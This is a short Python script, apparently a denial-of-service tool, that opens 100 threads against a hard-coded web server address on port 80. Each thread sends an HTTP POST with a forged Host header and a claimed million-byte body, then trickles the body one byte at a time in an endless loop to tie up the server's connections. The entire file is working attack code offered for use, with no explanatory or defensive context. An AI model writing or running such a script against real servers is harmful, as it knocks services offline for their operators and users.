import threading
import socket

target = "192.168.1.110"
port = 80
fake_ip = "182.21.45.78"

def attack():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))

        
            request = (
                "POST / HTTP/1.1\r\n"
                f"Host: {fake_ip}\r\n"
                "Content-Length: 1000000\r\n"  
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "\r\n"
            )
            s.sendall(request.encode('ascii'))
            

      
            while True:
                s.send(b"A")  
        except:
            pass  

for i in range(100):
    thread = threading.Thread(target=attack)
    thread.start()
